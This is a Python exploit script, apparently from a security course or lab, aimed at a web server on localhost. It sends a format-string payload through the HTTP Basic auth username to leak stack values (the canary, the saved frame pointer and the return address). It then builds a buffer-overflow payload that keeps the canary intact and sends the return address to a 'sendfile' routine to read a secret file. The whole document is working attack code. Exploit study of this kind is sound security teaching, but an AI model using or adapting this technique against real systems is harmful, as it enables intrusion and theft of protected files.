import binascii
import subprocess

def store_payload_binary(payload):
	with open("payload.bin", "wb") as bin_file:
		bin_file.write(binascii.unhexlify(payload))



def little_to_big_endian_conversion(input_str):
	ret_string = bytearray.fromhex(input_str)
	ret_string.reverse()
	ret_string = ''.join(format(x, '02x') for x in ret_string)
	return ret_string.upper()




def main():
	format_string = "%08x "*31
	curlCommand = """
		curl -X GET http://127.0.0.1:8000/check_secret.html -i \
		--user "{0}:"
	""".format(format_string)


	print("Curl command: \n", curlCommand)
	status, output = subprocess.getstatusoutput(curlCommand)

	output = output.replace("\"", "")
	output = output.replace("\n", "")
	output = output.split('Basic realm=Invalid user: ')[1]
	stack = output.split(" ")
	stack.remove("")  # remove redundant empty string

	canary = stack[26]
	saved_ebp = stack[29]
	ret_address = stack[30]

	# "3D" is the hex code for "=" which will be replaced in for loop after strcpy call
	canary = canary.replace('00','3D')


	string = "/secet/x" 
	path_string = string.encode("utf-8").hex().replace('0x','').upper()
	num_bytes = 13*4 - len(string)
	payload = path_string + "3D"*(num_bytes)


	# saved ebp of check_auth - post_data buffer address = 136
	t = int(saved_ebp, 16) - 136
	t = hex(t).replace('0x','').upper()
	payload += little_to_big_endian_conversion(t)

	# 1 random word = 4 random bytes
	payload += '3D'*4

	# 1 word = 4 bytes = canary
	payload += little_to_big_endian_conversion(canary) # write canary


	# 12 random bytes
	payload += '3D'*12


	# address of sendfile
	t = int(ret_address, 16) + 2284
	t = hex(t).replace('0x','').upper()
	payload += little_to_big_endian_conversion(t)

	# saved ebp of check_auth - post_data buffer address = 136
	t = int(saved_ebp, 16) - 136
	t = hex(t).replace('0x','').upper()
	payload += little_to_big_endian_conversion(t)


	store_payload_binary(payload+"00000000")


if __name__ == "__main__":
	main()